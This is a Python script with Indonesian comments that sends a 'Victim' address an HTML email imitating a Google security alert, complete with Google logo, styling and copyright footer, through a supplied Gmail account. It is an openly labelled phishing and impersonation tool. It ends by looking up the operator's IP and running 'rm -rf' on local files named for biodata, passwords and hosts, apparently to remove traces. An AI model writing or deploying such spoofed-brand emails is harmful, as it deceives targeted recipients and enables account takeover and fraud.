
import requests
import os
import json
import email, smtplib, ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


#Ambil input dari user
nama = input("Google: ")
passw = input("Pass: ")
victim = input("Victim : ")
sub = input("subject:")
# format teks
teks = "Nama: {}\nPass: {}\n---".format(nama, passw, victim, sub)
print(">>>>>>>>>>>>CHECK<<<<<<<<<<<<")
print ("Nama: {}\nPass: {}\n---".format(nama, passw, victim, sub))
print ("Google/Username = ", nama, ">>>check<<<")
print ("Pass            = ", passw, ">>>check<<<")
print ("Victim          = ", victim, ">>>check<<<")
print ("Send            = ", sub, ">>>check<<<")

subject = sub
sender_email = nama
receiver_email = victim
password = passw
# Isi BCC aja
message = MIMEMultipart('alternative')
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = sub
message["Bcc"] = nama # Recommended for mass emails

# Lampiran ke satu
text = """\
  Pemberitahuan keamanan penting untuk Akun Google anda
"""
html = """\
<html>
<head>
	<title>Pemberitahuan keamanan penting untuk Akun Google anda</title>
</head>
<body>
<div style="border-style:solid;border-width:thin;border-color:#dadce0;border-radius:8px;padding:40px 20px" align="center" class="m_-8803269918442021686mdv2rw">
	<img src="https://ci5.googleusercontent.com/proxy/T_zJ7UbaC9x27OP4-ZCPfDipqYLSGum30AlaxEycVclfvxO8Cze0sZ0kCrXlx6a-MgvW2tswbIyiNVfczjDuGh9okorzC5SUJDfwkHr6-3j1KUu94HuAw5uxM_jaElQef3Sub84=s0-d-e1-ft#https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" width="74" height="24" aria-hidden="true" style="margin-bottom:16px" alt="Google" class="CToWUd">
	<div style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;border-bottom:thin solid #dadce0;color:rgba(0,0,0,0.87);line-height:32px;padding-bottom:24px;text-align:center;word-break:break-word">
		<div style="font-size:24px">Setelan akses untuk aplikasi yang kurang aman telah diaktifkan untuk akun Anda</div>
				<table align="center" style="margin-top:8px">
					<tbody>
						<tr style="line-height:normal">
							<td align="right" style="padding-right:8px">
							</td>
							<td>
					<a style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.87);font-size:14px;line-height:20px"></a>
				</td>
			</tr>
		</tbody>
			</table> 
		</div>
		<div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:14px;color:rgba(0,0,0,0.87);line-height:20px;padding-top:20px;text-align:left">Setelan akses untuk aplikasi yang kurang aman telah diaktifkan untuk Akun Google Anda. Jika bukan Anda yang mengubahnya, sebaiknya periksa aktivitas pada akun.<div style="padding-top:32px;text-align:center"><a href="https://accounts.google.com/Login/identifier?flowName=GlifWebSignIn&flowEntry=AddSession" style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;line-height:16px;color:#ffffff;font-weight:400;text-decoration:none;font-size:14px;display:inline-block;padding:10px 24px;background-color:#4184f3;border-radius:5px;min-width:90px">Periksa aktivitas</a>
		</div>
	</div>
	<span class="im">
		<div style="padding-top:20px;font-size:12px;line-height:16px;color:#5f6368;letter-spacing:0.3px;text-align:center">Anda juga dapat langsung membuka:<br>
			<a style="color:rgba(0,0,0,0.87);text-decoration:inherit">https://myaccount.google.com/<wbr>notifications</a></div>
					</span>
					</div>
					<div>
						<div class="adm">
							<div id="q_239" class="ajR h4"><div class="ajT">
								
							</div>
						</div>
					</div>
					<div class="h5">
						<div style="text-align:left"><div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">
							<div>Anda menerima email ini sebagai pemberitahuan tentang perubahan penting pada layanan dan Akun Google Anda.</div>
							<div style="direction:ltr">© 2020 Google LLC, <a class="m_-8803269918442021686afal" style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</a>
							</div>

						</div>

					</div>

				</div>

			</div>

		</td>

		<td width="8" style="width:8px">
								
							</td>

						</tr>

					</tbody>

				</table>

			</td>

		</tr>

			<tr height="32" style="height:32px">
				<td>
					
				</td>
			</tr>
		</tbody>
	</table>
</div>
</div>
</body>
</html>
"""

# Turn these into plain/html MIMEText objects
part1 = MIMEText(text, "plain")
part2 = MIMEText(html, "html")

# Add HTML/plain-text parts to MIMEMultipart message
# The email client will try to render the last part first
import os
message.attach(part1)
message.attach(part2)
context = ssl.create_default_context()
try:
    mailServer = smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context)
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.login(sender_email, password)
    mailServer.sendmail(sender_email, receiver_email, message.as_string())
    mailServer.close()
    os.system('cat accsg.txt | lolcat')
except:
    os.system('cat accs.txt | lolcat')


import os
print ("wait 1.......")
print ("ganti alamat email pengirim")


res=requests.get('https://ipinfo.io/')
data = res.json()

IP=data['ip']
org=data['org']
city = data['city']
country=data['country']
region=data['region']

print ('Your IP detail\n ')
print ('IP : {4} \nRegion : {1} \nCountry : {2} \nCity : {3} \nOrg : {0}'.format(org,region,country,city,IP))
 

os.system('rm -rf biodata.txt passw.txt host.txt ip.txt')
 





 